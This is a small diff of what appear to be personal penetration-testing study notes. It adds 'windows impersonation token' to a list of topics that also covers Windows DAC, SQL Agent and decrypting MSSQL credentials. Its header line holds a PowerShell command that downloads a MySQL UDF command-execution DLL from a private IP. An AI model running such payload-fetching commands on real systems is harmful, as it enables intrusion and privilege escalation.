@@ -22,3 +22,4 @@ iwd 10.10.17.254/tools/lib_mysqludf_sys_64.dll -UseBasicParsing -o index.dll
 1. what is windows dac
 2. what is windows sql agent
 3. Decrypting MSSQL Credential Passwords https://www.netspi.com/blog/technical-blog/adversary-simulation/decrypting-mssql-credential-passwords/
+4. windows impersonation token
